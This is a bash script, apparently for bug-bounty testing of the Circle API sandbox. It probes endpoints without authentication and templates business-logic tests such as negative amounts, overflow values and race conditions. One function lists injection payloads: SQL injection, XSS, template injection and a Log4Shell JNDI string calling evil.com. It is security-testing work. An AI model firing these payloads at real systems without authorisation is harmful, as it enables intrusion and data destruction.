#!/bin/bash
# Circle API Business Logic Tester
# Tests for common fintech vulnerabilities

API_BASE="https://api-sandbox.circle.com"
RESULTS_DIR="/home/ubuntu/.openclaw/workspace/bugbounty/results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULTS_FILE="$RESULTS_DIR/business_logic_$TIMESTAMP.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}=== Circle API Business Logic Tester ===${NC}"
echo "Results: $RESULTS_FILE"
echo ""

# Check for API key
if [ -z "$CIRCLE_API_KEY" ]; then
    echo -e "${RED}Error: Set CIRCLE_API_KEY environment variable${NC}"
    echo "Usage: export CIRCLE_API_KEY='your_key'"
    echo "       $0"
    exit 1
fi

# Initialize results file
echo "Circle API Business Logic Test - $(date)" > "$RESULTS_FILE"
echo "==========================================" >> "$RESULTS_FILE"
echo "" >> "$RESULTS_FILE"

# Function to make API request
api_call() {
    local method=$1
    local endpoint=$2
    local data=$3
    
    if [ -n "$data" ]; then
        curl -s -w "\nHTTP_STATUS:%{http_code}" -X "$method" \
            -H "Authorization: Bearer $CIRCLE_API_KEY" \
            -H "Content-Type: application/json" \
            -d "$data" \
            "$API_BASE$endpoint" 2>&1
    else
        curl -s -w "\nHTTP_STATUS:%{http_code}" -X "$method" \
            -H "Authorization: Bearer $CIRCLE_API_KEY" \
            "$API_BASE$endpoint" 2>&1
    fi
}

# Test 1: Negative Amounts
test_negative_amounts() {
    echo -e "\n${YELLOW}[TEST 1] Negative Amounts${NC}"
    echo "Test 1: Negative Amounts" >> "$RESULTS_FILE"
    echo "------------------------" >> "$RESULTS_FILE"
    
    # This is a template - you'll need to adjust based on actual API structure
    # Example for a transfer endpoint:
    
    local test_data='{
        "amount": {"amount": "-100.00", "currency": "USD"},
        "source": {"type": "wallet", "id": "SOURCE_WALLET_ID"},
        "destination": {"type": "wallet", "id": "DEST_WALLET_ID"}
    }'
    
    echo "Testing negative amount transfer..." | tee -a "$RESULTS_FILE"
    echo "Request: $test_data" >> "$RESULTS_FILE"
    
    # Uncomment when you have real wallet IDs:
    # response=$(api_call "POST" "/v1/transfers" "$test_data")
    # echo "Response: $response" >> "$RESULTS_FILE"
    
    echo "Status: SKIPPED (needs wallet IDs)" | tee -a "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

# Test 2: Zero Amounts
test_zero_amounts() {
    echo -e "\n${YELLOW}[TEST 2] Zero Amounts${NC}"
    echo "Test 2: Zero Amounts" >> "$RESULTS_FILE"
    echo "-------------------" >> "$RESULTS_FILE"
    
    local test_data='{
        "amount": {"amount": "0.00", "currency": "USD"},
        "source": {"type": "wallet", "id": "SOURCE_WALLET_ID"},
        "destination": {"type": "wallet", "id": "DEST_WALLET_ID"}
    }'
    
    echo "Testing zero amount transfer..." | tee -a "$RESULTS_FILE"
    echo "Request: $test_data" >> "$RESULTS_FILE"
    echo "Status: SKIPPED (needs wallet IDs)" | tee -a "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

# Test 3: Very Large Amounts (Integer Overflow)
test_large_amounts() {
    echo -e "\n${YELLOW}[TEST 3] Large Amounts (Overflow Test)${NC}"
    echo "Test 3: Large Amounts" >> "$RESULTS_FILE"
    echo "--------------------" >> "$RESULTS_FILE"
    
    local test_amounts=(
        "999999999999.99"
        "2147483647.99"
        "9223372036854775807"
        "1e308"
    )
    
    for amount in "${test_amounts[@]}"; do
        echo "Testing amount: $amount" | tee -a "$RESULTS_FILE"
        # Add actual test here with real IDs
    done
    
    echo "Status: SKIPPED (template only)" | tee -a "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

# Test 4: Duplicate Requests (Race Condition)
test_duplicate_requests() {
    echo -e "\n${YELLOW}[TEST 4] Duplicate/Race Condition Test${NC}"
    echo "Test 4: Duplicate Requests" >> "$RESULTS_FILE"
    echo "-------------------------" >> "$RESULTS_FILE"
    
    echo "This test sends the same request multiple times rapidly" | tee -a "$RESULTS_FILE"
    echo "to check for race conditions or duplicate processing." | tee -a "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
    echo "Status: SKIPPED (needs implementation with real endpoints)" | tee -a "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

# Test 5: Special Characters and Injection
test_injection() {
    echo -e "\n${YELLOW}[TEST 5] Injection Tests${NC}"
    echo "Test 5: Injection Tests" >> "$RESULTS_FILE"
    echo "----------------------" >> "$RESULTS_FILE"
    
    local payloads=(
        "' OR '1'='1"
        "1; DROP TABLE users--"
        "<script>alert(1)</script>"
        "{{7*7}}"
        "\${jndi:ldap://evil.com/a}"
    )
    
    echo "Testing for injection vulnerabilities in text fields..." | tee -a "$RESULTS_FILE"
    for payload in "${payloads[@]}"; do
        echo "  Payload: $payload" >> "$RESULTS_FILE"
    done
    echo "" >> "$RESULTS_FILE"
    echo "Status: SKIPPED (template only)" | tee -a "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

# Test 6: Unauthorized Access
test_unauthorized() {
    echo -e "\n${YELLOW}[TEST 6] Unauthorized Access${NC}"
    echo "Test 6: Unauthorized Access" >> "$RESULTS_FILE"
    echo "--------------------------" >> "$RESULTS_FILE"
    
    echo "Testing endpoints without authentication..." | tee -a "$RESULTS_FILE"
    
    local endpoints=(
        "/v1/wallets"
        "/v1/transfers"
        "/v1/businesses"
        "/v1/banks"
    )
    
    for endpoint in "${endpoints[@]}"; do
        echo "Testing: $endpoint" >> "$RESULTS_FILE"
        response=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$API_BASE$endpoint" 2>&1)
        http_code=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
        echo "  No Auth - HTTP $http_code" >> "$RESULTS_FILE"
        
        if [ "$http_code" = "200" ]; then
            echo -e "  ${RED}✗ VULNERABLE: Endpoint accessible without auth!${NC}" | tee -a "$RESULTS_FILE"
        fi
    done
    
    echo "" >> "$RESULTS_FILE"
}

# Main execution
echo -e "${BLUE}Starting business logic tests...${NC}"
echo ""

test_unauthorized
test_negative_amounts
test_zero_amounts
test_large_amounts
test_duplicate_requests
test_injection

echo -e "\n${GREEN}Testing complete!${NC}"
echo -e "Results saved to: ${GREEN}$RESULTS_FILE${NC}"
echo ""
echo "Next steps:"
echo "1. Review the results file"
echo "2. Update the scripts with real wallet/business IDs"
echo "3. Run tests against actual endpoints"
echo "4. Document any vulnerabilities found"
echo ""
echo -e "${YELLOW}Note: These are templates. You must customize with real API endpoints and valid test data.${NC}"
